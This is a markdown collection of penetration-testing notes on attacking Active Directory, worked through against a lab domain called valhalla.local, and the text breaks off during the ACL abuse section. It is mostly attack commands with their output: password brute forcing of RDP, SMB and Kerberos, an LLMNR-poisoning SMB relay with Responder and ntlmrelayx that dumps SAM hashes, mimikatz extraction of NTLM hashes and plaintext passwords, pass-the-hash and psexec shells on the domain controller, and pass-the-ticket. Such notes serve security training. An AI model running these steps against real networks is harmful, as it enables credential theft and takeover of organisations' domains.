This is a collection of notes about active directory and (post)exploitation

- [USEFULL TOOLS](#usefull-tools)
- [Enumeration](#enumeration)
  * [Active Directory Enumeration](#active-directory-enumeration)
  * [Check smb version and server info](#check-smb-version-and-server-info)
    + [nmap](#nmap)
    + [metasploit](#metasploit)
    + [crackmapexec](#crackmapexec)
  * [Enum Local users](#enum-local-users)
    + [rpcclient](#rpcclient)
    + [impacket-lookupsid](#impacket-lookupsid)
  * [Bruteforce](#bruteforce)
    + [Rdp Brute Force](#rdp-brute-force)
    + [Kerbrute](#kerbrute)
    + [Metasploit](#metasploit)
    + [Crackmapexec](#crackmapexec)
  * [Enum Shares](#enum-shares)
    + [smbclient](#smbclient)
    + [smbmap](#smbmap)
    + [smb_enumshares](#smb-enumshares)
    + [crackmaexec](#crackmaexec)
  * [Checking your rights for remote device](#checking-your-rights-for-remote-device)
    + [SMB_Login](#smb-login)
    + [Crackmapexec](#crackmapexec-1)
  * [Sharphound](#sharphound)
  * [Bloodhound](#bloodhound)
- [Exploitation](#exploitation)
  * [SMB Relay Attack](#smb-relay-attack)
  * [Pass the Hash](#pass-the-hash)
  * [Pass the Ticket](#pass-the-ticket)
  * [Abusing ACL](#abusing-acl)
    + [GenericALL-User](#genericall-user)
    + [GenericALL-Group](#genericall-group)
  * [ms17_010_eternalblue](#ms17-010-eternalblue)
    + [smb_ms17_010](#smb-ms17-010)
  * [AS-REP Roasting](#as-rep-roasting)
    + [Generate vulnerability](#generate-vulnerability)
    + [Exploitation](#exploitation-1)
  * [Kerberoasting](#kerberoasting)
    + [Generate vulnerability](#generate-vulnerability-1)
    + [Exploitation](#exploitation-2)
- [Remote Code Execution](#remote-code-execution)
  * [WinRS](#winrs)
  * [Evil-WinRM](#evil-winrm)
  * [Impacket](#impacket)
    + [wmiexec](#wmiexec)
    + [smbexec](#smbexec)
    + [psexec](#psexec)
- [Post-Exploitation](#post-exploitation)
  * [Golden Ticket](#golden-ticket)
  * [Machine Domain admin-Use machine NTLM hash](#machine-domain-admin-use-machine-ntlm-hash)
  * [Credential Collection](#credential-collection)
    + [mimikatz logonpasswords](#mimikatz-logonpasswords)
    + [mimikatz dcsync](#mimikatz-dcsync)

<small><i><a href='http://ecotrust-canada.github.io/markdown-toc/'>Table of contents generated with markdown-toc</a></i></small>



# USEFULL TOOLS

Metasploit
Covenant
Powerview
Mimikatz
kerbrute
rubeus

# Enumeration

## Active Directory Enumeration

Get current Domain and Domain controller

	$var = [System.DirectoryServices.ActiveDirectory.Domain]
	$var::GetCurrentDomain()

Powerview

	Recon> Get-NetDomain
	
	
	Forest                  : valhalla.local
	DomainControllers       : {odin.valhalla.local}
	Children                : {}
	DomainMode              :
	Parent                  :
	PdcRoleOwner            : odin.valhalla.local
	RidRoleOwner            : odin.valhalla.local
	InfrastructureRoleOwner : odin.valhalla.local
	Name                    : valhalla.local
	
	

## Check smb version and server info

### nmap

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ sudo nmap -p445 --script smb-protocols 192.168.200.100 -O -Pn                                                                                   130 ⨯
	Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
	Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-19 15:55 EDT
	Nmap scan report for valhalla.local (192.168.200.100)
	Host is up (0.00040s latency).

	PORT    STATE SERVICE
	445/tcp open  microsoft-ds
	MAC Address: 00:0C:29:7F:AE:D8 (VMware)
	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
	Device type: general purpose
	Running: Microsoft Windows 2012
	OS CPE: cpe:/o:microsoft:windows_server_2012:r2
	OS details: Microsoft Windows Server 2012 or Windows Server 2012 R2
	Network Distance: 1 hop

	Host script results:
	| smb-protocols: 
	|   dialects: 
	|     NT LM 0.12 (SMBv1) [dangerous, but default]
	|     2.02
	|     2.10
	|     3.00
	|_    3.02

	OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 2.26 seconds



### metasploit

	msf6 auxiliary(scanner/smb/smb_version) > run
	[*] 192.168.200.100:445   - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.0.2) (signatures:required) (uptime:15m 42s) (guid:{0e6e2ca3-2bd4-4307-8e35-70564748263c}) (authentication domain:VALHALLA)
	[+] 192.168.200.100:445   -   Host is running Windows 2012 R2 Standard Evaluation (build:9600) (name:ODIN) (domain:VALHALLA)
	[*] valhalla.local:       - Scanned 1 of 1 hosts (100% complete)
	[*] Auxiliary module execution completed
	msf6 auxiliary(scanner/smb/smb_version) >


### crackmapexec

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ crackmapexec smb 192.168.200.100 
	SMB         192.168.200.100 445    ODIN             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:ODIN) (domain:valhalla.local) (signing:True) (SMBv1:True)


## Enum Local users

### rpcclient


	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ rpcclient -U testuser%Pass123! 192.168.200.100                                                                                                    1 ⨯
	rpcclient $> enumdomusers
	user:[Administrator] rid:[0x1f4]
	user:[Guest] rid:[0x1f5]
	user:[krbtgt] rid:[0x1f6]
	user:[danj] rid:[0x451]
	user:[adamb] rid:[0x452]
	user:[alans] rid:[0x453]
	.
	.
	.
	.
	user:[davidb1] rid:[0x547]
	user:[roastme] rid:[0x836]
	user:[kerberoastme] rid:[0x844]
	user:[testuser] rid:[0x845]
	user:[dontmindme] rid:[0x847]
	user:[iwouldmind] rid:[0x848]
	user:[mrblack] rid:[0x849]


### impacket-lookupsid

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ /usr/bin/impacket-lookupsid valhalla/thor:Pass123\!@192.168.200.110
	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

	[*] Brute forcing SIDs at 192.168.200.110
	[*] StringBinding ncacn_np:192.168.200.110[\pipe\lsarpc]
	[*] Domain SID is: S-1-5-21-3401829504-2746700306-4210517594
	500: THOR\Administrator (SidTypeUser)
	501: THOR\Guest (SidTypeUser)
	513: THOR\None (SidTypeGroup)
	1000: THOR\win7 (SidTypeUser)


## Bruteforce

### Rdp Brute Force

brute force with less privilege

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ patator rdp_login host=192.168.200.110 user="testuser" password=FILE0 0=pword.txt          
	11:51:29 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-08-19 11:51 EDT
	11:51:29 patator    INFO -                                                                              
	11:51:29 patator    INFO - code  size    time | candidate                          |   num | mesg
	11:51:29 patator    INFO - -----------------------------------------------------------------------------
	11:51:30 patator    INFO - 132   32     0.607 | admin                              |     1 | ERRCONNECT_AUTHENTICATION_FAILED
	11:51:30 patator    INFO - 132   32     0.609 | password                           |     2 | ERRCONNECT_AUTHENTICATION_FAILED
	11:51:30 patator    INFO - 132   32     0.622 | s3cr3t                             |     3 | ERRCONNECT_AUTHENTICATION_FAILED
	11:51:30 patator    INFO - 132   32     0.648 | 12345                              |     4 | ERRCONNECT_AUTHENTICATION_FAILED
	11:51:30 patator    INFO - 131   38     1.434 | Pass123!                           |     5 | ERRINFO_SERVER_INSUFFICIENT_PRIVILEGES
	11:51:31 patator    INFO - Hits/Done/Skip/Fail/Size: 5/5/0/0/5, Avg: 3 r/s, Time: 0h 0m 1s


Brute force with privilege account


	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ patator rdp_login host=192.168.200.110 user="administrator" password=FILE0 0=pword.txt
	11:51:16 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-08-19 11:51 EDT
	11:51:17 patator    INFO -                                                                              
	11:51:17 patator    INFO - code  size    time | candidate                          |   num | mesg
	11:51:17 patator    INFO - -----------------------------------------------------------------------------
	11:51:17 patator    INFO - 132   32     0.639 | admin                              |     1 | ERRCONNECT_AUTHENTICATION_FAILED
	11:51:17 patator    INFO - 132   32     0.648 | password                           |     2 | ERRCONNECT_AUTHENTICATION_FAILED
	11:51:17 patator    INFO - 132   32     0.647 | s3cr3t                             |     3 | ERRCONNECT_AUTHENTICATION_FAILED
	11:51:17 patator    INFO - 132   32     0.653 | 12345                              |     4 | ERRCONNECT_AUTHENTICATION_FAILED
	11:51:18 patator    INFO - 0     2      1.566 | Pass123!                           |     5 | OK
	11:51:19 patator    INFO - Hits/Done/Skip/Fail/Size: 5/5/0/0/5, Avg: 2 r/s, Time: 0h 0m 2s




### Kerbrute

Brute force usernames from DC (There is no log for this scan)


	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ ./kerbrute userenum --dc valhalla.local -d valhalla.local /usr/share/wordlists/metasploit/unix_users.txt

		__             __               __     
	   / /_____  _____/ /_  _______  __/ /____ 
	  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
	 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
	/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

	Version: v1.0.3 (9dad6e1) - 08/19/21 - Ronnie Flathers @ropnop

	2021/08/19 10:47:44 >  Using KDC(s):
	2021/08/19 10:47:44 >   valhalla.local:88

	2021/08/19 10:47:44 >  [+] VALID USERNAME:       administrator@valhalla.local
	2021/08/19 10:47:44 >  Done! Tested 167 usernames (1 valid) in 0.065 seconds



Bruteforce password for single user (There is no log for this scan)

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ ./kerbrute bruteuser -d valhalla.local --dc valhalla.local 500.txt testuser   

		__             __               __     
	   / /_____  _____/ /_  _______  __/ /____ 
	  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
	 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
	/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

	Version: v1.0.3 (9dad6e1) - 08/19/21 - Ronnie Flathers @ropnop

	2021/08/19 10:46:17 >  Using KDC(s):
	2021/08/19 10:46:17 >   valhalla.local:88

	2021/08/19 10:46:18 >  [+] VALID LOGIN:  testuser@valhalla.local:Pass123!
	2021/08/19 10:46:18 >  Done! Tested 500 logins (1 successes) in 1.019 seconds


### Metasploit

	msf6 auxiliary(scanner/smb/smb_login) > set pass_file pword.txt
	pass_file => pword.txt
	msf6 auxiliary(scanner/smb/smb_login) > run

	[*] 192.168.200.100:445   - 192.168.200.100:445 - Starting SMB login bruteforce
	[-] 192.168.200.100:445   - 192.168.200.100:445 - Failed: 'valhalla.local\administrator:admin',
	[-] 192.168.200.100:445   - 192.168.200.100:445 - Failed: 'valhalla.local\administrator:password',
	[-] 192.168.200.100:445   - 192.168.200.100:445 - Failed: 'valhalla.local\administrator:s3cr3t',
	[-] 192.168.200.100:445   - 192.168.200.100:445 - Failed: 'valhalla.local\administrator:12345',
	[+] 192.168.200.100:445   - 192.168.200.100:445 - Success: 'valhalla.local\administrator:Pass123!' Administrator
	[*] valhalla.local:445    - Scanned 1 of 1 hosts (100% complete)
	[*] Auxiliary module execution completed
	
	
### Crackmapexec

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ crackmapexec smb 192.168.200.100 -u thor -p pword.txt -d valhalla.local          
	SMB         192.168.200.100 445    ODIN             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:ODIN) (domain:valhalla.local) (signing:True) (SMBv1:True)
	SMB         192.168.200.100 445    ODIN             [-] valhalla.local\thor:admin STATUS_LOGON_FAILURE 
	SMB         192.168.200.100 445    ODIN             [-] valhalla.local\thor:password STATUS_LOGON_FAILURE 
	SMB         192.168.200.100 445    ODIN             [-] valhalla.local\thor:s3cr3t STATUS_LOGON_FAILURE 
	SMB         192.168.200.100 445    ODIN             [-] valhalla.local\thor:12345 STATUS_LOGON_FAILURE 
	SMB         192.168.200.100 445    ODIN             [+] valhalla.local\thor:Pass123!



## Enum Shares

### smbclient

Detect

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ smbclient -L 192.168.200.100 -U valhalla.local/testuser                                                                                           1 ⨯
	Enter VALHALLA.LOCAL\testuser's password: 

			Sharename       Type      Comment
			---------       ----      -------
			ADMIN$          Disk      Remote Admin
			C$              Disk      Default share
			IPC$            IPC       Remote IPC
			NETLOGON        Disk      Logon server share 
			share           Disk      
			SYSVOL          Disk      Logon server share 
	SMB1 disabled -- no workgroup available


Connect

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ smbclient \\\\192.168.200.100\\share -U valhalla.local/testuser
	Enter VALHALLA.LOCAL\testuser's password: 
	Try "help" to get a list of possible commands.
	smb: \> ls
	  .                                   D        0  Sat Aug 14 19:43:34 2021
	  ..                                  D        0  Sat Aug 14 19:43:34 2021
	  projectx.txt                        A       24  Sat Aug 14 20:07:25 2021

					15638527 blocks of size 4096. 13126313 blocks available
	smb: \> get projectx.txt 
	getting file \projectx.txt of size 24 as projectx.txt (11.7 KiloBytes/sec) (average 11.7 KiloBytes/sec)
	smb: \> 


### smbmap

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ smbmap -H 192.168.200.100 -d valhalla.local -u testuser -p Pass123!
	[+] IP: 192.168.200.100:445     Name: valhalla.local                                    
			Disk                                                    Permissions     Comment
			----                                                    -----------     -------
			ADMIN$                                                  NO ACCESS       Remote Admin
			C$                                                      NO ACCESS       Default share
			IPC$                                                    READ ONLY       Remote IPC
			NETLOGON                                                READ ONLY       Logon server share 
			share                                                   READ ONLY
			SYSVOL                                                  READ ONLY       Logon server share 


### smb_enumshares

	msf6 auxiliary(scanner/smb/smb_enumshares) > set smbuser thor
	smbuser => thor
	msf6 auxiliary(scanner/smb/smb_enumshares) > set smbpass Pass123!
	smbpass => Pass123!
	msf6 auxiliary(scanner/smb/smb_enumshares) > set smbdomain valhalla.local
	smbdomain => valhalla.local
	msf6 auxiliary(scanner/smb/smb_enumshares) > set rhosts 192.168.200.100
	rhosts => 192.168.200.100
	msf6 auxiliary(scanner/smb/smb_enumshares) > run

	[-] 192.168.200.100:139   - Login Failed: Unable to negotiate SMB1 with the remote host: Not a valid SMB packet
	[!] 192.168.200.100:445   - peer_native_os is only available with SMB1 (current version: SMB3)
	[!] 192.168.200.100:445   - peer_native_lm is only available with SMB1 (current version: SMB3)
	[+] 192.168.200.100:445   - ADMIN$ - (DISK) Remote Admin
	[+] 192.168.200.100:445   - C$ - (DISK) Default share
	[+] 192.168.200.100:445   - IPC$ - (IPC) Remote IPC
	[+] 192.168.200.100:445   - NETLOGON - (DISK) Logon server share 
	[+] 192.168.200.100:445   - SYSVOL - (DISK) Logon server share 
	[*] 192.168.200.100:      - Scanned 1 of 1 hosts (100% complete)
	[*] Auxiliary module execution completed


### crackmaexec

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ crackmapexec smb 192.168.200.100 -u thor -p Pass123! -d valhalla.local --shares
	SMB         192.168.200.100 445    ODIN             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:ODIN) (domain:valhalla.local) (signing:True) (SMBv1:True)
	SMB         192.168.200.100 445    ODIN             [+] valhalla.local\thor:Pass123! 
	SMB         192.168.200.100 445    ODIN             [+] Enumerated shares
	SMB         192.168.200.100 445    ODIN             Share           Permissions     Remark
	SMB         192.168.200.100 445    ODIN             -----           -----------     ------
	SMB         192.168.200.100 445    ODIN             ADMIN$                          Remote Admin
	SMB         192.168.200.100 445    ODIN             C$                              Default share
	SMB         192.168.200.100 445    ODIN             IPC$                            Remote IPC
	SMB         192.168.200.100 445    ODIN             NETLOGON        READ            Logon server share 
	SMB         192.168.200.100 445    ODIN             SYSVOL          READ            Logon server share 



## Checking your rights for remote device

### SMB_Login

	msf6 auxiliary(scanner/smb/smb_login) > set smbuser administrator
	smbuser => administrator
	msf6 auxiliary(scanner/smb/smb_login) > set smbpass Pass123!
	smbpass => Pass123!
	msf6 auxiliary(scanner/smb/smb_login) > set smbdomain valhalla.local
	smbdomain => valhalla.local
	msf6 auxiliary(scanner/smb/smb_login) > run
	[*] 192.168.200.100:445   - 192.168.200.100:445 - Starting SMB login bruteforce
	[+] 192.168.200.100:445   - 192.168.200.100:445 - Success: 'valhalla.local\administrator:Pass123!' Administrator
	[*] valhalla.local:445    - Scanned 1 of 1 hosts (100% complete)
	[*] Auxiliary module execution completed
	msf6 auxiliary(scanner/smb/smb_login) > 
	
### Crackmapexec

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ crackmapexec smb valhalla.local -u administrator -p Pass123!                                                                                   1 ⚙
	SMB         192.168.200.100 445    ODIN             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:ODIN) (domain:valhalla.local) (signing:True) (SMBv1:True)
	SMB         192.168.200.100 445    ODIN             [+] valhalla.local\administrator:Pass123! (Pwn3d!)
 
	

## Sharphound

If you want to run Sharphound from a PC that is not joined to the target domain, open a command prompt and run:

	runas /netonly /user:DOMAIN\USER powershell.exe
	Enter the password for DOMAIN\USER:
	Attempting to start powershell.exe as user "DOMAIN\USER" ...
	
Then import Sharpound and run it as normal.

	import-module sharphound.ps1
	invoke-bloodhound -collectionmethod all -domain TARGETDOMAIN
	.\SharpHound.exe --CollectionMethod all -d valhalla.local
	

## Bloodhound

	sudo apt-get install bloodhound

	sudo neo4j console (change initial password / http://127.0.0.1:7474 / neo4j - neo4j)
	
	bloodhound (another terminal)


# Exploitation

## SMB Relay Attack

SMB sign should be disabled

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ nmap --script=smb2-security-mode.nse -iL target.txt -Pn -p445,139
	Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
	Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-14 16:36 EDT
	Nmap scan report for valhalla.local (192.168.200.100)
	Host is up (0.00058s latency).

	PORT    STATE SERVICE
	139/tcp open  netbios-ssn
	445/tcp open  microsoft-ds

	Host script results:
	| smb2-security-mode: 
	|   2.02: 
	|_    Message signing enabled but not required

	Nmap scan report for 192.168.200.110
	Host is up (0.00067s latency).

	PORT    STATE SERVICE
	139/tcp open  netbios-ssn
	445/tcp open  microsoft-ds

	Host script results:
	| smb2-security-mode: 
	|   2.02: 
	|_    Message signing enabled but not required

	Nmap done: 2 IP addresses (2 hosts up) scanned in 13.28 seconds
                                                                                                                                                       

Responder HTTP and SMB server should be disabled


	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ cat /etc/responder/Responder.conf 
	[Responder Core]

	; Servers to start
	SQL = On
	SMB = Off
	RDP = On
	Kerberos = On
	FTP = On
	POP = On
	SMTP = On
	IMAP = On
	HTTP = Off
	HTTPS = On
	DNS = On
	LDAP = On
	.......



Start Responder in shell-1


	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ sudo /usr/sbin/responder -I eth0 -rv                                                                                                         255 ⨯
											 __
	  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
	  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
	  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
					   |__|

			   NBT-NS, LLMNR & MDNS Responder 3.0.2.0

	  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
	  To kill this script hit CTRL-C


	[+] Poisoners:
		LLMNR                      [ON]
		NBT-NS                     [ON]
		DNS/MDNS                   [ON]

	[+] Servers:
		HTTP server                [OFF]
		HTTPS server               [ON]
		WPAD proxy                 [OFF]
		Auth proxy                 [OFF]
		SMB server                 [OFF]
		Kerberos server            [ON]
		SQL server                 [ON]
		FTP server                 [ON]
		IMAP server                [ON]
		POP3 server                [ON]
		SMTP server                [ON]
		DNS server                 [ON]
		LDAP server                [ON]
		RDP server                 [ON]

	[+] HTTP Options:
		Always serving EXE         [OFF]
		Serving EXE                [OFF]
		Serving HTML               [OFF]
		Upstream Proxy             [OFF]

	[+] Poisoning Options:
		Analyze Mode               [OFF]
		Force WPAD auth            [OFF]
		Force Basic Auth           [OFF]
		Force LM downgrade         [OFF]
		Fingerprint hosts          [OFF]

	[+] Generic Options:
		Responder NIC              [eth0]
		Responder IP               [192.168.200.101]
		Challenge set              [random]
		Don't Respond To Names     ['ISATAP']



	[+] Listening for events...


Start ntlmrelayx from shell-2

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf target.txt -smb2support
	[sudo] password for kali: 
	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

	[*] Protocol Client SMB loaded..
	[*] Protocol Client RPC loaded..
	[*] Protocol Client IMAP loaded..
	[*] Protocol Client IMAPS loaded..
	[*] Protocol Client DCSYNC loaded..
	[*] Protocol Client LDAP loaded..
	[*] Protocol Client LDAPS loaded..
	[*] Protocol Client HTTP loaded..
	[*] Protocol Client HTTPS loaded..
	[*] Protocol Client MSSQL loaded..
	[*] Protocol Client SMTP loaded..
	[*] Running in relay mode to hosts in targetfile
	[*] Setting up SMB Server
	[*] Setting up HTTP Server
	[*] Setting up WCF Server

	[*] Servers started, waiting for connections
	
	
	
Now one of the user need to try to access an unknown or not exist share 

Computer-1 will nagigate

	\\idontexit

We will capture that Computer-1 request to relay our targets. If User who logged in computer-1 has Admin rights for our targets, we will get SAM hash of our targets


responder shell


	[+] Listening for events...
	[*] [LLMNR]  Poisoned answer sent to 192.168.200.100 for name idontexist
	[*] [LLMNR]  Poisoned answer sent to 192.168.200.100 for name idontexist

ntlmrelayx shell

	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
	└─$ sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf target.txt -smb2support
	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

	[*] Protocol Client SMB loaded..
	[*] Protocol Client RPC loaded..
	[*] Protocol Client IMAP loaded..
	[*] Protocol Client IMAPS loaded..
	[*] Protocol Client DCSYNC loaded..
	[*] Protocol Client LDAP loaded..
	[*] Protocol Client LDAPS loaded..
	[*] Protocol Client HTTP loaded..
	[*] Protocol Client HTTPS loaded..
	[*] Protocol Client MSSQL loaded..
	[*] Protocol Client SMTP loaded..
	[*] Running in relay mode to hosts in targetfile
	[*] Setting up SMB Server
	[*] Setting up HTTP Server
	[*] Setting up WCF Server

	[*] Servers started, waiting for connections
	[*] SMBD-Thread-4: Connection from VALHALLA/ADMINISTRATOR@192.168.200.100 controlled, attacking target smb://192.168.200.100
	[-] Authenticating against smb://192.168.200.100 as VALHALLA/ADMINISTRATOR FAILED
	[*] SMBD-Thread-5: Connection from VALHALLA/ADMINISTRATOR@192.168.200.100 controlled, attacking target smb://192.168.200.110
	[*] Authenticating against smb://192.168.200.110 as VALHALLA/ADMINISTRATOR SUCCEED
	[*] SMBD-Thread-5: Connection from VALHALLA/ADMINISTRATOR@192.168.200.100 controlled, but there are no more targets left!
	[*] Service RemoteRegistry is in stopped state
	[*] Starting service RemoteRegistry
	[*] Target system bootKey: 0xc80bb860144b087eaf36f6fb4d7cb913
	[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	win7:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	[*] Done dumping SAM hashes for host: 192.168.200.110
	[*] Stopping service RemoteRegistry



## Pass the Hash

open mimikatz on Admin or SYSTEM privilege. Get password and hash from memory

	mimikatz # privilege::debug
	Privilege '20' OK

	mimikatz # sekurlsa::logonpasswords

	Authentication Id : 0 ; 2524343 (00000000:002684b7)
	Session           : CachedInteractive from 1
	User Name         : Administrator
	Domain            : VALHALLA
	Logon Server      : ODIN
	Logon Time        : 8/21/2021 7:16:03 PM
	SID               : S-1-5-21-3410397846-649609989-2919355437-500
			msv :
			 [00010000] CredentialKeys
			 * NTLM     : c718f548c75062ada93250db208d3178
			 * SHA1     : b27655136bebed1e53ded6cb9f837c450e7bb524
			 [00000003] Primary
			 * Username : Administrator
			 * Domain   : VALHALLA
			 * NTLM     : c718f548c75062ada93250db208d3178
			 * SHA1     : b27655136bebed1e53ded6cb9f837c450e7bb524
			tspkg :
			wdigest :
			 * Username : Administrator
			 * Domain   : VALHALLA
			 * Password : (null)
			kerberos :
			 * Username : Administrator
			 * Domain   : VALHALLA.LOCAL
			 * Password : Pass123!
			ssp :
			credman :


use captured hash and spawn a cmd



	mimikatz # sekurlsa::pth /user:administrator /domain:valhalla.local /ntlm:c718f548c75062ada93250db208d3178
	user    : administrator
	domain  : valhalla.local
	program : cmd.exe
	impers. : no
	NTLM    : c718f548c75062ada93250db208d3178
	  |  PID  5992
	  |  TID  5732
	  |  LSA Process is now R/W
	  |  LUID 0 ; 2566096 (00000000:002727d0)
	  \_ msv1_0   - data copy @ 0000028A14C33E00 : OK !
	  \_ kerberos - data copy @ 0000028A14C99C98
	   \_ aes256_hmac       -> null
	   \_ aes128_hmac       -> null
	   \_ rc4_hmac_nt       OK
	   \_ rc4_hmac_old      OK
	   \_ rc4_md4           OK
	   \_ rc4_hmac_nt_exp   OK
	   \_ rc4_hmac_old_exp  OK
	   \_ *Password replace @ 0000028A14D670E8 (24) -> null


check for your privilege


	C:\Windows\system32>dir \\odin\C$
	 Volume in drive \\odin\C$ has no label.
	 Volume Serial Number is 3C56-D664

	 Directory of \\odin\C$

	08/22/2013  06:52 PM    <DIR>          PerfLogs
	08/13/2021  07:37 AM    <DIR>          Program Files
	08/22/2013  06:39 PM    <DIR>          Program Files (x86)
	08/13/2021  07:06 AM    <DIR>          Users
	08/14/2021  12:07 AM    <DIR>          Windows
				   0 File(s)              0 bytes
				   5 Dir(s)  54,546,784,256 bytes free


we are still in local machine

	C:\Windows\system32>hostname
	loki

if we want a remote shell we can use psexec.exe


	C:\Windows\system32>cd C:\Users\mrblack\Desktop\PSTools

	C:\Users\mrblack\Desktop\PSTools>PsExec.exe \\odin cmd.exe

	PsExec v2.34 - Execute processes remotely
	Copyright (C) 2001-2021 Mark Russinovich
	Sysinternals - www.sysinternals.com
	Microsoft Windows [Version 6.3.9600](c) 2013 Microsoft Corporation. All rights reserved.

	C:\Windows\system32>whoami
	valhalla\administrator

	C:\Windows\system32>hostname
	odin

	C:\Windows\system32>ipconfig

	Windows IP Configuration


	Ethernet adapter Ethernet0:

	   Connection-specific DNS Suffix  . :
	   Link-local IPv6 Address . . . . . : fe80::d130:77d8:36c:afe%12
	   IPv4 Address. . . . . . . . . . . : 192.168.200.100
	   Subnet Mask . . . . . . . . . . . : 255.255.255.0
	   Default Gateway . . . . . . . . . :

	Tunnel adapter isatap.{82B0F91C-D6B0-48AA-935A-1CCE190951A5}:

	   Media State . . . . . . . . . . . : Media disconnected
	   Connection-specific DNS Suffix  . :


## Pass the Ticket

firstly administrator should RDP to remote host so TGT will be stored inside memory

Check for Ticket Granting Ticket inside memory

	sekurlsa::tickets
	

![image](https://user-images.githubusercontent.com/13157446/130322640-4a7ede43-c670-4c46-8495-ac120415c3e2.png)

	
Export tickets

	Sekurlsa::tickets /export


inject TGT the memory and open cmd

![image](https://user-images.githubusercontent.com/13157446/130322674-610de4dc-5998-4fd1-ab96-d3807741f8b5.png)



check current tickets

![image](https://user-images.githubusercontent.com/13157446/130322696-6d6da2c7-0982-4650-994a-f2bed7f6fc94.png)


check you access

	dir \\odin\c$\


![image](https://user-images.githubusercontent.com/13157446/130322707-c5e5d93c-cf17-46f7-9b08-a675ec60a83d.png)


## Abusing ACL

### GenericALL-User

We will check bloodhound and user has GenericAll rights for another user

![image](https://user-images.githubusercontent.com/13157446/129450372-671b8874-0d30-48fd-8163-8c003cc7fdb2.png)

dontmindme user can change iwouldmind users password without knowing prior password

![image](https://user-images.githubusercontent.com/13157446/129450621-c28f34d9-8f4a-4bc8-8c18-efb44e977cb9.png)

Fail with another user

	PS C:\Users\testuser\Desktop\sharphound> whoami
	valhalla\testuser
	PS C:\Users\testuser\Desktop\sharphound> net user iwouldmind NewPass123! /domain
	İstek, valhalla.local etki alanının denetleyicisinde işlenecek.

	5 sistem hatası oldu.

	Erişim engellendi.

	PS C:\Users\testuser\Desktop\sharphound>


### GenericALL-Group

Groups for dontmindme user 

	PS C:\Users\testuser\Desktop\sharphound> net user dontmindme /domain
	İstek, valhalla.local etki alanının denetleyicisinde işlenecek.

	Kullanıcı adı                         dontmindme
	Tam ad                                dontmindme
	Açıklama
	Kullanıcı açıklaması
	Ülke kodu                             000 (Sistem Varsayılan değer)
	Hesap etkin                           Evet
	Hesap zaman aşımı                     Asla

	Parolanın son ayarlanmadı             14.08.2021 17:59:27
	Parola süre sonu                      Asla
	Değişebilir parola                    15.08.2021 17:59:27
	Parola gerekli                        Evet
	Kullanıcı parolayı değiştirebilir     Evet

	İzin verilen iş istasyonları          Tümü
	Oturum açma kodu
	Kullanıcı profili
	Ana dizin
	Son oturum açma                       14.08.2021 18:03:51

	İzin verilen oturum açma saatleri     Tümü

	Yerel Grup Üyeliği
	Genel Grup üyeliği                    *Domain Users
	Komut başarıyla tamamlandı.

Groups for iwouldmind user

	PS C:\Users\testuser\Desktop\sharphound> net user iwouldmind /domain
	İstek, valhalla.local etki alanının denetleyicisinde işlenecek.

	Kullanıcı adı                         iwouldmind
	Tam ad                                iwouldmind
	Açıklama
	Kullanıcı açıklaması
	Ülke kodu                             000 (Sistem Varsayılan değer)
	Hesap etkin                           Evet
	Hesap zaman aşımı                     Asla

	Parolanın son ayarlanmadı             14.08.2021 18:04:09
	Parola süre sonu                      Asla
	Değişebilir parola                    15.08.2021 18:04:09
	Parola gerekli                        Evet
	Kullanıcı parolayı değiştirebilir     Evet

	İzin verilen iş istasyonları          Tümü
